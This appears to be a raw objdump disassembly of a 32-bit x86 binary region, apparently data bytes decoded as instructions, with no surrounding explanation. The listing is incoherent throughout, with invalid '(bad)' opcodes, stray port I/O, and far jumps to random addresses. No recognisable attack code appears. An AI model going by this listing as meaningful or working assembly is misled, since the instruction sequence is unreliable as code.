  4250af:	dec    ebp
  4250b0:	sub    edi,esp
  4250b2:	stc    
  4250b3:	add    bh,BYTE PTR [edi+0x26]
  4250b6:	out    dx,al
  4250b7:	sub    BYTE PTR [esi],bl
  4250b9:	gs push esi
  4250bb:	or     BYTE PTR [ecx+0x4fdf6880],0xc4
  4250c2:	jmp    0x425136
  4250c4:	addr16 pop ss
  4250c6:	sub    esi,DWORD PTR [ecx+0x69fb277a]
  4250cc:	push   esi
  4250cd:	push   ebp
  4250ce:	jle    0x425056
  4250d0:	sub    al,0x87
  4250d2:	inc    esi
  4250d3:	push   cs
  4250d4:	push   ss
  4250d5:	outs   dx,BYTE PTR ds:[esi]
  4250d6:	shl    eax,0xb9
  4250d9:	adc    BYTE PTR [edx+0x18012da8],cl
  4250df:	jnp    0x425087
  4250e1:	jge    0x425130
  4250e3:	mov    edx,0xdf0789bc
  4250e8:	jmp    0x3c0a9aeb
  4250ed:	outs   dx,BYTE PTR ds:[esi]
  4250ee:	lds    esp,FWORD PTR [eax]
  4250f0:	repnz xchg esp,eax
  4250f2:	sbb    cl,BYTE PTR [eax+0x60]
  4250f5:	cli    
  4250f6:	out    dx,al
  4250f7:	fiadd  WORD PTR [ebp-0x2ebfb867]
  4250fd:	test   BYTE PTR [edx],al
  4250ff:	mov    ds:0xee5b31c1,al
  425104:	dec    edx
  425105:	stc    
  425106:	jmp    FWORD PTR [esp+ebp*1+0x1b]
  42510a:	jns    0x425189
  42510c:	int    0x6
  42510e:	or     al,0x5f
  425110:	mov    DWORD PTR [eax],0x0
	...
  425172:	add    BYTE PTR [eax],al
  425174:	ficom  WORD PTR [ecx]
  425176:	lahf   
  425177:	and    ebx,edi
  425179:	scas   eax,DWORD PTR es:[edi]
  42517a:	(bad)  
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0x32b4:0x713692e8
  425184:	outs   dx,DWORD PTR ds:[esi]
  425185:	mov    WORD PTR [ecx],es
  425187:	add    BYTE PTR ds:0x26000001,al
  42518d:	std    
  42518e:	push   es
  42518f:	stc    
  425190:	mov    dl,0xb9
  425192:	icebp  
  425193:	lock or ecx,DWORD PTR [esi]
  425196:	pop    ds
  425197:	clc    
  425198:	inc    esp
  425199:	fs mov ebp,0x3c60250f
  42519f:	jg     0x42521b
  4251a1:	mov    ebx,DWORD PTR [esi+ecx*2]
  4251a4:	inc    eax
  4251a5:	loopne 0x425128
  4251a7:	cmp    DWORD PTR [ecx],ebx
  4251a9:	push   edx
  4251aa:	es retf 0x5860
  4251ae:	xor    DWORD PTR [ecx*2-0x6c3f0ea3],0x6f
  4251b6:	jne    0x425153
  4251b8:	mov    WORD PTR [ebx],ds
  4251ba:	pop    ecx
  4251bb:	add    BYTE PTR [eiz*4-0xec53cfb],bh
  4251c2:	aad    0xd2
  4251c4:	adc    DWORD PTR [ebp+0x22eb347c],0x788144c3
  4251ce:	mov    WORD PTR [ecx+0x726469a6],cs
  4251d4:	es ins BYTE PTR es:[edi],dx
  4251d6:	jo     0x4251da
  4251d8:	push   ebx
  4251d9:	jg     0x425176
  4251db:	stos   BYTE PTR es:[edi],al
  4251dc:	pop    ecx
  4251dd:	pop    es
  4251de:	or     BYTE PTR [edx],dl
  4251e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4251e1:	fs mov ebp,0x212b41f0
  4251e7:	in     al,0xff
  4251e9:	or     eax,0xe925ba1b
  4251ee:	adc    eax,0x9f0726be
  4251f3:	cli    
  4251f4:	sbb    edi,DWORD PTR [esi]
  4251f6:	ins    BYTE PTR es:[edi],dx
  4251f7:	xor    al,0xa2
  4251f9:	icebp  
  4251fa:	mov    ch,0xa7
  4251fc:	fisubr WORD PTR [ebp+0x7e]
  4251ff:	dec    edx
  425200:	or     ecx,DWORD PTR [eax+edx*4]
  425203:	std    
  425204:	das    
  425205:	xchg   BYTE PTR [ecx+0x27862c15],dh
  42520b:	ja     0x425281
  42520d:	in     al,0xb8
  42520f:	nop
  425210:	mov    cl,0x51
  425212:	ja     0x4251af
  425214:	es pop edx
  425216:	lods   eax,DWORD PTR ds:[esi]
  425217:	test   al,0x68
  425219:	les    eax,FWORD PTR [eax+edx*1+0x4e]
  42521d:	imul   esp,DWORD PTR [ecx-0x21],0x461ce212
  425224:	mov    ah,0xea
  425226:	inc    edx
  425227:	xchg   edx,eax
  425228:	push   ds
  425229:	sbb    edi,DWORD PTR [ebp-0x7c]
  42522c:	cs cmp ebp,DWORD PTR cs:[eax]
  425230:	out    0x83,eax
  425232:	outs   dx,DWORD PTR ds:[esi]
  425233:	stos   BYTE PTR es:[di],al
  425235:	jp     0x4252a7
  425237:	imul   esp,DWORD PTR [ebp+eax*8-0x42d33550],0x61f156d9
  425242:	ins    BYTE PTR es:[edi],dx
  425243:	sbb    eax,0xa4e41424
  425248:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425249:	int3   
  42524a:	(bad)  
  42524b:	aas    
  42524c:	mov    WORD PTR [edx],?
  42524e:	pop    es
  42524f:	comiss xmm3,DWORD PTR [eax+0x5]
  425253:	xor    al,0xbd
  425255:	dec    ebx
  425256:	xor    eax,DWORD PTR [ebx+0x663ebc48]
  42525c:	jmp    0x425271
  42525e:	sub    BYTE PTR [ebp-0x2af75ba4],bh
  425264:	repz (bad) 
  425266:	jl     0x4252e3
  425268:	mov    esi,0xd7cd5a2b
  42526d:	cli    
  42526e:	adc    bh,BYTE PTR [eax+esi*1+0x2]
  425272:	lods   al,BYTE PTR ds:[esi]
  425273:	out    dx,al
  425274:	mov    ebp,0x65a030a1
  425279:	les    esp,FWORD PTR [ecx+esi*4]
  42527c:	and    bh,BYTE PTR [ebx+0x5b9692fa]
  425282:	rcl    ecx,0x8e
  425285:	xor    al,0x10
  425287:	mov    ds:0xe516e7c7,eax
  42528c:	mov    edx,0x278473e8
	...
  4252f1:	add    BYTE PTR [eax],al
  4252f3:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	mov    bl,0x3e
  425302:	mov    dh,0xa5
  425304:	je     0x425293
  425306:	add    DWORD PTR [eax],eax
  425308:	add    eax,0x7a000001
  42530d:	pop    edx
  42530e:	retf   
  42530f:	jns    0x425368
  425311:	mov    ds:0xe9ad19ed,eax
  425316:	mov    eax,0x19e9424
  42531b:	push   es
  42531c:	(bad)  
  42531d:	sbb    al,0xf1
  42531f:	add    DWORD PTR [ecx+0x75],ebx
  425322:	inc    ebx
  425323:	pop    ebp
  425324:	enter  0x96c9,0x99
  425328:	cli    
  425329:	xchg   edx,eax
  42532a:	fldcw  WORD PTR [edx]
  42532c:	lods   eax,DWORD PTR ds:[esi]
  42532d:	xor    eax,0x49d6c69a
  425332:	das    
  425333:	jns    0x425377
  425335:	xchg   ebx,eax
  425336:	(bad)
  425339:	fwait
  42533a:	call   0x478899c3
  42533f:	daa    
  425340:	out    dx,al
  425341:	cdq    
  425342:	sub    BYTE PTR [edi-0x33a04b06],0x18
  425349:	jno    0x425369
  42534b:	ds jmp 0x49e03339
  425351:	cmp    al,0x8
  425353:	mov    ds,ebx
  425355:	ins    DWORD PTR es:[edi],dx
  425356:	retf   0x1e25
  425359:	mov    dh,0xad
  42535b:	in     al,0x1e
  42535d:	int3   
  42535e:	lods   al,BYTE PTR ds:[esi]
  42535f:	retf   0x2b7b
  425362:	sbb    al,0x6d
  425364:	in     eax,0xd0
  425366:	dec    DWORD PTR [ebx-0x7598df49]
  42536c:	sub    bl,bh
  42536e:	sbb    esi,DWORD PTR [ecx+0x3695905c]
  425374:	ins    DWORD PTR es:[edi],dx
  425375:	xor    eax,0x34ff0ab6
  42537a:	add    DWORD PTR [ebp+0x8b4f079],esi
  425380:	into   
  425381:	mov    eax,DWORD PTR [edi+ebx*4+0x3b]
  425385:	fcomp  QWORD PTR [ebp-0x502c7ed3]
  42538b:	cmc    
  42538c:	fsubrp st(6),st
  42538e:	adc    esp,edx
  425390:	and    al,0x4b
  425392:	xchg   edx,eax
  425393:	xchg   BYTE PTR ds:0x72ea3b53,dl
  425399:	jg     0x4253bf
  42539b:	daa    
  42539c:	js     0x42541a
  42539e:	mov    ecx,0xa32f9c5a
  4253a3:	xchg   edx,eax
  4253a4:	mov    ?,eax
  4253a6:	leave  
  4253a7:	mov    al,ch
  4253a9:	cld    
  4253aa:	jo     0x425379
  4253ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253ad:	jmp    0xcb48:0x64d9a967
  4253b4:	ror    edi,0x4
  4253b7:	ins    DWORD PTR es:[edi],dx
  4253b8:	and    edx,DWORD PTR [edx]
  4253ba:	xchg   ebp,eax
  4253bb:	push   0xa0fdd7ce
  4253c0:	adc    BYTE PTR [edi-0xfad32c7],bh
  4253c6:	xor    esi,edi
  4253c8:	and    BYTE PTR [esi],dl
  4253ca:	pop    ds
  4253cb:	or     DWORD PTR [ebx+ebp*8],eax
  4253ce:	add    eax,0x225c72b2
  4253d3:	in     al,0x56
  4253d5:	js     0x42536c
  4253d7:	or     ecx,DWORD PTR [eax]
  4253d9:	mov    esi,0x8a438da7
  4253de:	mov    edi,0xfbbcf657
  4253e3:	pushf  
  4253e4:	xor    DWORD PTR ds:0xfc0f5faa,eax
  4253ea:	inc    eax
  4253eb:	pop    es
  4253ec:	in     al,0xd8
  4253ee:	pop    edx
  4253ef:	ja     0x42542a
  4253f1:	je     0x4253ef
  4253f3:	fild   WORD PTR [ebx+0x4f]
  4253f6:	xor    BYTE PTR [edx+0x3c98cfc2],bl
  4253fc:	pop    es
  4253fd:	out    dx,eax
  4253fe:	inc    edi
  4253ff:	data16 cmp dl,dl
  425402:	push   ss
  425403:	jmp    0x42544e
  425405:	xor    BYTE PTR [ecx+0x3f3e7e67],bl
  42540b:	fsubrp st(0),st
  42540d:	mov    bl,0x52
  42540f:	iret   
  425410:	and    al,0x0
	...
  425472:	add    BYTE PTR [eax],al
  425474:	inc    edx
  425475:	or     esp,eax
  425477:	test   eax,0xeb6fedcf
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    esp,DWORD PTR [esi-0x65]
  425482:	jl     0x425411
  425484:	jns    0x425414
  425486:	add    DWORD PTR [eax],eax
  425488:	add    eax,0xdf000001
  42548d:	xchg   DWORD PTR [edi],esp
  42548f:	add    eax,0xef33df3b
  425494:	ja     0x425471
  425496:	je     0x4254d4
  425498:	sub    al,0xa6
  42549a:	xchg   ebx,eax
  42549b:	dec    eax
  42549c:	scas   al,BYTE PTR es:[edi]
  42549d:	xor    eax,DWORD PTR [ecx+0x13]
  4254a0:	addr16 push ecx
  4254a2:	push   es
  4254a3:	inc    edi
  4254a4:	loop   0x42550a
  4254a6:	jbe    0x42547b
  4254a8:	popf   
  4254a9:	retf   
  4254aa:	mov    dl,0x39
  4254ac:	jns    0x425510
  4254ae:	repz push esp
  4254b0:	retf   
  4254b1:	imul   BYTE PTR [esi]
  4254b3:	sahf   
  4254b4:	sub    ah,BYTE PTR [edx]
  4254b6:	fbstp  TBYTE PTR [ebx+0x73]
  4254b9:	add    BYTE PTR [ebx+0x39],cl
  4254bc:	pop    esi
  4254bd:	xchg   esp,eax
  4254be:	retf   0xc812
  4254c1:	rol    DWORD PTR [esi],cl
  4254c3:	mov    edx,0x950bf0c4
  4254c8:	test   BYTE PTR [edx+eiz*2+0x61],0x98
  4254cd:	push   esi
  4254ce:	out    0xcf,eax
  4254d0:	xchg   esi,eax
  4254d1:	int    0xe2
  4254d3:	xchg   BYTE PTR [eax],bh
  4254d5:	cli    
  4254d6:	jbe    0x425516
  4254d8:	cmp    eax,DWORD PTR [eax]
  4254da:	mov    edi,0x17888536
  4254df:	pusha  
  4254e0:	sub    DWORD PTR [eax],esi
  4254e2:	cdq    
  4254e3:	sbb    al,0xbb
  4254e5:	(bad)  
  4254e6:	pop    ds
  4254e7:	and    bh,cl
  4254e9:	push   esp
  4254ea:	xor    al,0xc3
  4254ec:	inc    ebx
  4254ed:	sbb    al,0x76
  4254ef:	xchg   edx,eax
  4254f0:	out    dx,al
  4254f1:	mov    BYTE PTR [edx-0x78fcbd18],dh
  4254f7:	out    dx,eax
  4254f8:	cmp    ecx,edi
  4254fa:	cs out 0xc8,eax
  4254fd:	ss scas eax,DWORD PTR es:[edi]
  4254ff:	xchg   BYTE PTR [esi],bl
  425501:	pusha  
  425502:	stc    
  425503:	push   edx
  425504:	dec    eax
  425505:	inc    eax
  425506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425507:	dec    edi
  425508:	jno    0x42555a
  42550a:	into   
  42550b:	nop
  42550c:	cmp    BYTE PTR [esi],bh
  42550e:	sbb    edi,DWORD PTR [ecx]
  425510:	dec    ecx
  425511:	pushf  
  425512:	pop    ebp
  425513:	popf   
  425514:	dec    edi
  425515:	pushf  
  425516:	push   edi
  425517:	mov    cl,0xbc
  425519:	add    DWORD PTR [eiz*1+0x11d657d9],edx
  425520:	jge    0x425535
  425522:	or     eax,DWORD PTR [ebp-0x41]
  425525:	dec    ebp
  425526:	sub    dh,BYTE PTR [esi]
  425528:	sbb    dh,BYTE PTR [esi+eiz*1-0x66]
  42552c:	xchg   edx,eax
  42552d:	push   eax
  42552e:	in     eax,dx
  42552f:	inc    ebx
  425530:	pusha  
  425531:	(bad)  
  425533:	cli    
  425534:	mov    esi,0x9cd95cb2
  425539:	mov    eax,ds:0xe5adc78a
  42553e:	sub    BYTE PTR [ebx+0x3f],cl
  425541:	js     0x4254e9
  425543:	arpl   di,si
  425545:	gs fdiv st,st(7)
  425548:	out    0x4e,al
  42554a:	imul   ebp,DWORD PTR ds:0xb5b85246,0xfffffffa
  425551:	add    DWORD PTR [ecx],edi
  425553:	dec    edx
  425554:	inc    esi
  425555:	in     eax,dx
  425556:	stos   DWORD PTR es:[edi],eax
  425557:	cld    
  425558:	cmp    edi,DWORD PTR [edi]
  42555a:	push   ecx
  42555b:	outs   dx,BYTE PTR ds:[esi]
  42555c:	lea    edi,[esp+edx*2-0x5]
  425560:	pushf  
  425561:	sbb    BYTE PTR [edi+0x4b105483],al
  425567:	leave  
  425568:	jmp    0x425510
  42556a:	ret    0xf374
  42556d:	sbb    dl,BYTE PTR [esi+eax*2]
  425570:	std    
  425571:	cmc    
  425572:	xchg   esi,eax
  425573:	cmp    al,0xf0
  425575:	pop    esi
  425576:	and    DWORD PTR [ecx-0x36],0xe143e917
  42557d:	or     BYTE PTR [ecx],dh
  42557f:	jb     0x425594
  425581:	cmp    DWORD PTR [edx+0x37],ebx
  425584:	mov    ecx,DWORD PTR [ecx-0x77]
  425587:	add    bh,cl
  425589:	(bad)  
  42558a:	push   ecx
  42558b:	or     al,0xe3
  42558d:	or     ecx,ecx
  42558f:	gs xchg esi,eax
	...
  4255f1:	add    BYTE PTR [eax],al
  4255f3:	add    ah,al
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0xd27cf13a
  425602:	mov    ah,0xb9
  425604:	jle    0x425595
  425606:	add    DWORD PTR [eax],eax
  425608:	add    eax,0x5a000001
  42560d:	ret    0xf46a
  425610:	enter  0xe851,0x8c
  425614:	mov    ch,0x85
  425616:	imul   edx,DWORD PTR [ebx],0x3eb75d07
  42561c:	lds    ebx,FWORD PTR [edi+eiz*2+0x6b]
  425620:	int3   
  425621:	inc    ebx
  425622:	(bad)  
  425623:	mov    ds:0xd30a6dd0,eax
  425628:	xor    bl,BYTE PTR [esp+esi*1-0x707bf4a3]
  42562f:	stc    
  425630:	out    0x9f,al
  425632:	add    eax,esi
  425634:	ret    0x1335
  425637:	out    dx,al
  425638:	inc    edi
  425639:	or     BYTE PTR [edi-0x6706de96],dl
  42563f:	fisub  WORD PTR [ecx-0x516d2778]
  425645:	push   esp
  425646:	mov    ds:0xe0e1401a,al
  42564b:	pop    esi
  42564c:	mov    bh,0xa7
  42564e:	in     al,0xc4
  425650:	cdq    
  425651:	sti    
  425652:	sbb    ah,BYTE PTR [ebx+ecx*4+0xcd9d0ab]
  425659:	cmp    al,0x7f
  42565b:	sbb    ebp,esp
  42565d:	imul   edi,DWORD PTR [eax],0x54909a25
  425663:	cmc    
  425664:	xchg   edi,eax
  425665:	ins    BYTE PTR es:[edi],dx
  425666:	jp     0x425615
  425668:	mov    DWORD PTR [ebp-0x5d],edi
  42566b:	xchg   DWORD PTR [eax-0x2dc6de4e],edi
  425671:	mov    dl,0xfc
  425673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425674:	fnsave [edx]
  425676:	fbld   TBYTE PTR [ecx+edx*8-0x27f772ba]
  42567d:	push   ebp
  42567e:	retf   0x7575
  425681:	pop    DWORD PTR [ebp+0x3f]
  425684:	(bad)  
  425685:	dec    BYTE PTR [esi]
  425687:	xchg   DWORD PTR [ecx+eiz*8-0x78],ecx
  42568b:	fisttp QWORD PTR [eax]
  42568d:	rcr    BYTE PTR [esi+0x51],cl
  425690:	push   edi
  425691:	icebp  
  425692:	shl    DWORD PTR [eax],1
  425694:	jo     0x425661
  425696:	cwde   
  425697:	inc    edx
  425698:	cmp    edx,0xc49ccfdf
  42569e:	out    dx,eax
  42569f:	ds push cs
  4256a1:	(bad)  
  4256a2:	cmp    esp,ecx
  4256a4:	mov    ch,0x5c
  4256a6:	mov    edx,0x6a686db8
  4256ab:	ins    DWORD PTR es:[edi],dx
  4256ac:	rcr    BYTE PTR [edi+0x6ecda09e],0xd3
  4256b3:	jbe    0x425693
  4256b5:	into   
  4256b6:	imul   ebx,esi,0x73
  4256b9:	(bad)  
  4256ba:	imul   ebp,DWORD PTR [ebp-0x7cae051a],0x3e
  4256c1:	popf   
  4256c2:	es jbe 0x425697
  4256c5:	push   0x22
  4256c7:	(bad)  
  4256c8:	aam    0xd4
  4256ca:	aad    0x33
  4256cc:	xor    al,0x2
  4256ce:	and    DWORD PTR [ecx],esp
  4256d0:	fucomi st,st(4)
  4256d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256d3:	(bad)  
  4256d4:	fld    TBYTE PTR [ebx]
  4256d6:	xor    eax,eax
  4256d8:	mul    al
  4256da:	jg     0x42570e
  4256dc:	sbb    esi,esp
  4256de:	dec    esi
  4256df:	shr    DWORD PTR [ebx-0x27],1
  4256e2:	pop    edx
  4256e3:	(bad)  
  4256e4:	dec    esp
  4256e5:	or     al,0xc4
  4256e7:	cmp    al,BYTE PTR [eax]
  4256e9:	in     al,dx
  4256ea:	or     BYTE PTR [edi-0x8],bl
  4256ed:	push   cs
  4256ee:	mov    cl,0xa4
  4256f0:	mov    ecx,0xca98286a
  4256f5:	mov    ebx,0xa5b4edf3
  4256fa:	jae    0x4256d4
  4256fc:	adc    al,0x49
  4256fe:	mov    ebp,0x7df0f3a
  425703:	jmp    0xe8e:0x3d33e290
  42570a:	je     0x425781
  42570c:	pop    ebx
  42570d:	sub    eax,0x343055
	...
  425772:	add    BYTE PTR [eax],al
  425774:	(bad)  
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0x1194d74
  425783:	inc    edx
  425784:	adc    DWORD PTR [eax+0x1050001],0x0
  42578b:	add    dh,dl
  42578d:	adc    eax,DWORD PTR [edx-0x4f608eb9]
  425793:	test   BYTE PTR [edi],0xed
  425796:	add    dh,dh
  425798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425799:	add    DWORD PTR [edx+0x5bc041ad],edx
  42579f:	mov    dh,0x5a
  4257a1:	mov    ds:0xdd8bcd3d,al
  4257a6:	xchg   esp,eax
  4257a7:	mov    ds:0x22319506,al
  4257ac:	mov    ebp,0xa1046951
  4257b1:	sbb    al,0x9c
  4257b3:	dec    esp
  4257b4:	enter  0x1419,0xc3
  4257b8:	addr16 inc esi
  4257ba:	inc    ecx
  4257bb:	inc    eax
  4257bc:	sub    BYTE PTR [edx+ecx*1],al
  4257bf:	mov    al,0x3a
  4257c1:	test   BYTE PTR es:[esi+eiz*4+0x9329fda],ch
  4257c9:	sahf   
  4257ca:	and    eax,0x917951e6
  4257cf:	xor    edx,DWORD PTR [edx+ebp*8-0x32]
  4257d3:	pop    edi
  4257d4:	jb     0x4257d0
  4257d6:	cmp    eax,0xfdb8b821
  4257db:	retf   
  4257dc:	mov    ebx,0xaf1a0f56
  4257e1:	xchg   edx,eax
  4257e2:	pop    ebp
  4257e3:	lea    esp,[edx-0x32]
  4257e6:	out    0xee,al
  4257e8:	outs   dx,BYTE PTR ds:[esi]
  4257e9:	hlt    
  4257ea:	mov    ecx,0x1a60f5b8
  4257ef:	popa   
  4257f0:	pop    ds
  4257f1:	call   0xa956:0xeef991b3
  4257f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4257f9:	jecxz  0x4257ba
  4257fb:	ds dec edi
  4257fd:	or     eax,0xf5114f3c
  425802:	call   0xd153:0xde5c566d
  425809:	fcomp  st(3)
  42580b:	stos   DWORD PTR es:[edi],eax
  42580c:	repz jl 0x4257c9
  42580f:	pop    ds
  425810:	inc    edi
  425811:	ret    0x7946
  425814:	in     al,0x26
  425816:	sub    bh,BYTE PTR [eax-0x49]
  425819:	ins    BYTE PTR es:[edi],dx
  42581a:	sub    dh,BYTE PTR [eax-0x27]
  42581d:	mov    dh,BYTE PTR [esi-0x2c]
  425820:	ror    BYTE PTR es:[esi],1
  425823:	loop   0x42588d
  425825:	mov    dl,0x8e
  425827:	sbb    DWORD PTR [edi+edx*2+0x7816bcc2],edx
  42582e:	push   es
  42582f:	xchg   edx,eax
  425830:	rol    dl,0xed
  425833:	jb     0x4257f4
  425835:	shr    BYTE PTR [eax-0x49],1
  425838:	ja     0x4257e5
  42583a:	mov    eax,0x56ae61f5
  42583f:	sbb    al,0x2b
  425841:	mov    ch,0xa0
  425843:	popf   
  425844:	push   edi
  425845:	into   
  425846:	cwde   
  425847:	mov    bh,0x2c
  425849:	cmc    
  42584a:	retf   
  42584b:	add    bh,BYTE PTR [ecx+0x1c]
  42584e:	stos   DWORD PTR es:[edi],eax
  42584f:	cmp    DWORD PTR [edi-0x75197a3f],edi
  425855:	dec    edi
  425856:	jle    0x425861
  425858:	ret    0x88a5
  42585b:	push   ss
  42585c:	sar    DWORD PTR [edx+edx*8-0x7fd744da],1
  425863:	adc    eax,0x4a543281
  425868:	enter  0x91e3,0xdd
  42586c:	sahf   
  42586d:	cmc    
  42586e:	mov    ebp,DWORD PTR [esi+0x5837d363]
  425874:	bound  ecx,QWORD PTR [ebp-0x5359c1fc]
  42587a:	mov    cl,0x44
  42587c:	mov    eax,0x1d7bf781
  425881:	cmp    dl,BYTE PTR [ecx+0x64f7b5bc]
  425887:	mov    eax,0x5fa94a84
  42588c:	stos   DWORD PTR es:[edi],eax
  42588d:	mov    ds:0x206054,al
	...
  4258f2:	add    BYTE PTR [eax],al
  4258f4:	pop    esp
  4258f5:	push   edx
  4258f6:	nop
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	ret    
  425901:	iret   
  425902:	or     BYTE PTR [ecx],ch
  425904:	mov    BYTE PTR [ecx+0x1050001],dl
  42590a:	add    BYTE PTR [eax],al
  42590c:	rcl    BYTE PTR [ecx-0x28],0xc4
  425910:	mov    esi,0xdd1c1b7d
  425915:	jo     0x4258f0
  425917:	add    al,0xa4
  425919:	adc    DWORD PTR [eax-0x1abc1017],0xffffffe5
  425920:	mov    dh,0x72
  425922:	adc    ecx,DWORD PTR [ebx+0x65f2036]
  425928:	cmc    
  425929:	les    ebx,FWORD PTR [esi]
  42592b:	fs xor al,0x78
  42592e:	lods   eax,DWORD PTR ds:[esi]
  42592f:	sbb    al,al
  425931:	test   al,0xdf
  425933:	sub    ebx,DWORD PTR [esi]
  425935:	pop    eax
  425936:	pop    eax
  425937:	call   0x8e586b31
  42593c:	rol    DWORD PTR [ebx+0x55],1
  42593f:	dec    esi
  425940:	shl    DWORD PTR [edx-0x3a5bea61],1
  425946:	mov    al,ds:0xfcc75038
  42594b:	in     al,0x2c
  42594d:	adc    ah,BYTE PTR [ebx+0x72]
  425950:	or     al,0x75
  425952:	pop    esp
  425953:	cld    
  425954:	push   edx
  425955:	mov    esi,0xe59d0963
  42595a:	lahf   
  42595b:	scas   al,BYTE PTR es:[edi]
  42595c:	pop    ds
  42595d:	pop    ebp
  42595e:	push   ebx
  42595f:	sbb    BYTE PTR [esi-0x13],cl
  425962:	into   
  425963:	pop    ebx
  425964:	sbb    al,0x7c
  425966:	sbb    BYTE PTR [ecx-0x5463d39],dl
  42596c:	adc    eax,0xba43ab4d
  425971:	jne    0x4259a5
  425973:	mov    bl,0x17
  425975:	mov    ebp,0x79090ce3
  42597a:	dec    edi
  42597b:	jl     0x4259e0
  42597d:	pop    esi
  42597e:	add    bl,0x2a
  425981:	pop    ebx
  425982:	arpl   WORD PTR [edx],dx
  425984:	dec    ecx
  425985:	retf   
  425986:	das    
  425987:	adc    DWORD PTR [ebp+0x65],edx
  42598a:	mov    ch,0xcf
  42598c:	lods   al,BYTE PTR ds:[esi]
  42598d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42598e:	or     dl,BYTE PTR [ebx]
  425990:	push   0x1b
  425992:	mov    ch,0xe5
  425994:	adc    eax,0x541f857f
  425999:	test   DWORD PTR [esi],ecx
  42599b:	xchg   edx,eax
  42599c:	out    0xaa,eax
  42599e:	xor    ebp,esi
  4259a0:	sub    bl,ah
  4259a2:	sbb    eax,0x53b6e8aa
  4259a7:	jg     0x425938
  4259a9:	loop   0x4259f5
  4259ab:	inc    ecx
  4259ac:	fnstcw WORD PTR [edi]
  4259ae:	jp     0x425a1e
  4259b0:	pop    edi
  4259b1:	pop    ebp
  4259b2:	dec    ecx
  4259b3:	popa   
  4259b4:	scas   eax,DWORD PTR es:[edi]
  4259b5:	ss jbe 0x4259d7
  4259b8:	pop    edi
  4259b9:	ja     0x4259db
  4259bb:	out    0x41,al
  4259bd:	xchg   esp,eax
  4259be:	scas   eax,DWORD PTR es:[edi]
  4259bf:	push   edi
  4259c0:	push   ebx
  4259c1:	mov    esp,0x6d920903
  4259c6:	imul   eax,DWORD PTR [ebx*2+0x1cbfd67f],0xffffff83
  4259ce:	dec    ebx
  4259cf:	test   al,0xce
  4259d1:	test   BYTE PTR [ecx+0x63],ah
  4259d4:	call   0x4a84:0xb804bd
  4259db:	sub    BYTE PTR [esi-0x74cec62a],ch
  4259e1:	mov    eax,ds:0x66eabba8
  4259e6:	idiv   BYTE PTR [ecx]
  4259e8:	test   ch,bl
  4259ea:	stc    
  4259eb:	cwde   
  4259ec:	addr16 leave 
  4259ee:	jecxz  0x425a68
  4259f0:	in     al,0xe
  4259f2:	aas    
  4259f3:	pop    edx
  4259f4:	add    DWORD PTR [ebx+0x48b5a2f4],esp
  4259fa:	out    dx,eax
  4259fb:	jle    0x425986
  4259fd:	push   esi
  4259fe:	inc    edx
  4259ff:	mov    dl,0x9c
  425a01:	popa   
  425a02:	jmp    0xc3b10bc3
  425a07:	ret    0x5ce4
  425a0a:	in     eax,0x4f
  425a0c:	add    cl,ch
  425a0e:	pop    edx
  425a0f:	lods   eax,DWORD PTR ds:[esi]
  425a10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  425a71:	add    BYTE PTR [eax],al
  425a73:	add    cl,al
  425a75:	arpl   WORD PTR [edi+eiz*2],ax
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4+0x24652472]
  425a84:	lea    edx,[edx+0x1050001]
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	fisttp DWORD PTR [edi]
  425a8e:	fwait
  425a8f:	mov    ?,WORD PTR [edi+0x62]
  425a92:	add    al,bl
  425a94:	xor    al,0xd3
  425a96:	add    BYTE PTR [esi+0x3c],ch
  425a99:	push   ebp
  425a9a:	out    dx,eax
  425a9b:	leave  
  425a9c:	ins    BYTE PTR es:[edi],dx
  425a9d:	jbe    0x425a4c
  425a9f:	inc    edx
  425aa0:	test   DWORD PTR [esi],edx
  425aa2:	hlt    
  425aa3:	jno    0x425aeb
  425aa5:	(bad)  
  425aa6:	inc    esp
  425aa7:	(bad)
  425aab:	mov    al,BYTE PTR [edx]
  425aad:	pop    ds
  425aae:	stos   DWORD PTR es:[edi],eax
  425aaf:	add    eax,0x86184ecb
  425ab4:	pop    ebp
  425ab5:	clc    
  425ab6:	call   0x225f:0xaf2af21a
  425abd:	fmul   DWORD PTR [ecx+0x7e]
  425ac0:	daa    
  425ac1:	inc    ecx
  425ac2:	nop
  425ac3:	outs   dx,BYTE PTR ds:[esi]
  425ac4:	cmp    eax,0x98a08b1
  425ac9:	push   eax
  425aca:	mov    al,ds:0xe8c9dca0
  425acf:	adc    al,0xab
  425ad1:	mov    BYTE PTR [ebx-0x1969ac46],al
  425ad7:	jne    0x425aba
  425ad9:	mov    al,0x88
  425adb:	je     0x425ac6
  425add:	ins    BYTE PTR es:[edi],dx
  425ade:	(bad)  
  425adf:	neg    DWORD PTR [ebx-0x5f4a3742]
  425ae5:	sbb    bl,bl
  425ae7:	mov    ds:0x73636f14,al
  425aec:	mov    edx,0xccef6606
  425af1:	mov    ds:0x69be7189,al
  425af6:	sub    BYTE PTR [eax+ebp*4],0xf5
  425afa:	sub    ch,dl
  425afc:	test   DWORD PTR [ebx+0x16],esi
  425aff:	fidivr WORD PTR [edi+0x9]
  425b02:	call   0x17c1:0x4ec5001c
  425b09:	mov    ch,0x21
